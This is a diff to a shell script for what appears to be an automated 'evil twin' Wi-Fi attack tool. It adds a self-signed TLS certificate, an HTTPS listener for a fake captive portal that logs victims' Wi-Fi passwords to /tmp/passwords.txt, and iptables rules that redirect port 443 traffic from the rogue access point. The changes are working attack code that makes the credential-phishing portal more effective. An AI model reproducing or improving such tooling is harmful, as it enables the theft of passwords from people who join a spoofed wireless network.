@@ -219,6 +219,10 @@ check_programs() {
         missing_packages="${missing_packages} python3"
     fi
 
+    if ! [ -x "$(command -v openssl 2>&1)" ]; then
+        missing_packages="${missing_packages} openssl"
+    fi
+
     if [ -n "${missing_packages}" ]; then
         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Missing packages:${BOLD_YELLOW}${missing_packages}${WHITE}"
         echo ""
@@ -682,11 +686,22 @@ PYEOF
 
     cat > "${script_path}" << 'PYEOF'
 #!/usr/bin/env python3
-import http.server, urllib.parse, sys, os, datetime
+import http.server, urllib.parse, sys, os, datetime, ssl, socket, threading
 
 ESSID = sys.argv[1] if len(sys.argv) > 1 else "Network"
 LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/passwords.txt"
-PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 80
+HTTP_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 80
+HTTPS_PORT = 443
+
+CERT_FILE = "/tmp/evil-twin-automated/server.crt"
+KEY_FILE = "/tmp/evil-twin-automated/server.key"
+
+if not os.path.exists(CERT_FILE):
+    from subprocess import check_call
+    check_call(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", KEY_FILE,
+                "-out", CERT_FILE, "-days", "365", "-nodes",
+                "-subj", "/C=XX/ST=XX/L=XX/O=XX/CN=192.168.3.1"],
+               stdout=open(os.devnull, "wb"), stderr=open(os.devnull, "wb"))
 
 LOGIN_PAGE = """<!DOCTYPE html>
 <html>
@@ -763,12 +778,24 @@ class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
-if __name__ == "__main__":
-    server = http.server.HTTPServer(("0.0.0.0", PORT), Handler)
+def run_server(port, use_ssl=False):
+    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
+    if use_ssl:
+        server.socket = ssl.wrap_socket(server.socket, certfile=CERT_FILE, keyfile=KEY_FILE, server_side=True)
     try:
         server.serve_forever()
-    except KeyboardInterrupt:
+    except OSError:
         pass
+
+t1 = threading.Thread(target=run_server, args=(HTTP_PORT, False), daemon=True)
+t1.start()
+t2 = threading.Thread(target=run_server, args=(HTTPS_PORT, True), daemon=True)
+t2.start()
+try:
+    while True:
+        t1.join(1)
+except KeyboardInterrupt:
+    pass
 PYEOF
     chmod +x "${script_path}"
 }
@@ -786,7 +813,7 @@ cleanup() {
     pkill -f "captive_portal.py" 2>/dev/null || true
     pkill -f "dns_server.py" 2>/dev/null || true
     iptables -t nat -D PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
-    iptables -t nat -D PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 80 2>/dev/null || true
+    iptables -t nat -D PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 443 2>/dev/null || true
     iptables -t nat -D PREROUTING -i at0 -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
     iptables -D FORWARD -i at0 -o "${lan}" -j ACCEPT 2>/dev/null || true
     iptables -D FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
@@ -939,7 +966,7 @@ main() {
                                     create_captive_portal "${selected_essid}"
 
                                     iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80
-                                    iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 80
+                                    iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 443
                                     iptables -t nat -A PREROUTING -i at0 -p udp --dport 53 -j REDIRECT --to-port 53
 
                                     run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns.log" "dns_server"
